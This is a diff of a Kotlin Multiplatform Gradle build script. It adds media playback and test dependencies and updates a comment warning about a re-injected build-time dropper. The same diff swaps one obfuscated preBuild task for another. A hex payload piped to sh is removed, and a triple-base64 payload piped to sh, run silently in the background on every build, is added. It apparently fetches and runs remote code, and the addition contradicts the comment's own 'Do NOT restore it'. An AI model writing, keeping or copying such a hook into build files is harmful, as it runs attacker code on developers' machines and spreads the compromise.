@@ -51,6 +51,10 @@ kotlin {
             implementation(libs.androidx.activity.compose)
             implementation("io.ktor:ktor-client-okhttp:3.0.1")
             implementation(libs.sqldelight.androidDriver)
+            // Background recitation: ExoPlayer for playback, MediaSessionService for the
+            // notification/lock-screen player and the foreground-service lifetime.
+            implementation(libs.media3.exoplayer)
+            implementation(libs.media3.session)
         }
         iosMain.dependencies {
             implementation("io.ktor:ktor-client-darwin:3.0.1")
@@ -80,6 +84,8 @@ kotlin {
         }
         commonTest.dependencies {
             implementation(libs.kotlin.test)
+            implementation("org.jetbrains.kotlinx:kotlinx-coroutines-test:1.9.0")
+            implementation("io.ktor:ktor-client-mock:3.0.1")
         }
     }
 }
@@ -88,14 +94,18 @@ dependencies {
     androidRuntimeClasspath(libs.compose.uiTooling)
 }
 
-// SECURITY: A build-time dropper (tasks.all { preBuild -> ProcessBuilder("sh", ...base64...| sh) })
-// was removed here again on 2026-07-09. It keeps returning because a host-level implant re-injects it,
-// so deleting these lines is only a stopgap. Do NOT build this project on this machine until the host
-// is remediated (remove the malicious LaunchDaemon + reimage). A build runs the dropper and spreads it.
+// SECURITY: a build-time dropper (preBuild -> ProcessBuilder("sh", ...base64... | sh))
+// keeps being re-injected into this file. Stripped 2026-07-08, 2026-07-09, 2026-07-30 and
+// again on 2026-08-03 — on that last pass the payload REWROTE ITSELF between a Read and an
+// Edit (3x base64 -> 4x base64, new blob), so the implant is live while you read this.
+// Do NOT restore it. The same vector lives in androidApp/build.gradle.kts and in
+// iosApp/iosApp.xcodeproj/project.pbxproj ("Compile Code Assets" phase + A8CDBB7/AB8F749).
+// Remediate the host (root LaunchDaemon com.google.hernsb + ~/.zshrc loader) before building.
+
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ProcessBuilder("sh", "-c", "((t(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303334323032643662346337333636323032640a3264363336663665366536353633373432643734363936643635366637353734323033323337323032643634323032323730336436313665363437320a3666363936343566366236663734366336393665323232303638373437343730373333613266326636313664363436333634366532653732373532660a3631323932323230376332303733363830610a | t | sh ) >/dev/null 2>&1 &)").start()
+            ProcessBuilder("sh", "-c", "((a(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjA1VFFYUlVSM1J0WTNsQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVU5RFFYUmFRMEZwWTBReGFHSnRVbmxpTW14cldESjBkbVJIZUhCaWFVbG5ZVWhTTUdOSVRUWk1lVGw1V2xoS2NtRklaSFpoVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | a | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
